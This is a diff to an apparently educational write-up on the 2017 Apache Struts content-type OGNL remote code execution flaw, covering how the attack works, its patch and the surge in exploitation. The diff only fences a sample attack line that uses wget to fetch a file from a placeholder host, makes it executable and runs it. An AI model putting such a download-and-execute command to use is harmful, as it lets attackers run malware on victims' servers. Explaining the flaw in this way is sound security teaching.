@@ -23,7 +23,9 @@ When a client sends an HTTP request to a server running Apache Struts, a content
 
 If a content-type message is deliberately made up by an attacker, evaluation of this message as OGNL expression will enable the attacker to execute any commands on servers. To make matters worse, attackers can redirect outputs of executions to the feedback to them. In this way, they can see results of executions and do further damage, for example, locating and transferring critical data (Sahu, 2017). A typical RCE attack is to download and run malicious files on host machines. (As illustrated by the code follows.)
 
+```
 #cmds=({'wget –c http://www.xxx.com/fileX; chmod 777 fileX;./fileX;'})
+```
 
 The flaw was patched by disabling the use of “LocalizedTextUtil.findText” function. Although it was patched on March 6, many websites didn’t get updates in time. Shortly after the update was available, the number of attacks exploiting this bug grew dramatically (Goodin, 2017). It seemed that many attackers were not aware of the bug until it was officially announced. And they reacted to it more quickly than programmers maintaining those vulnerable websites, if there were any maintainer at all.
 
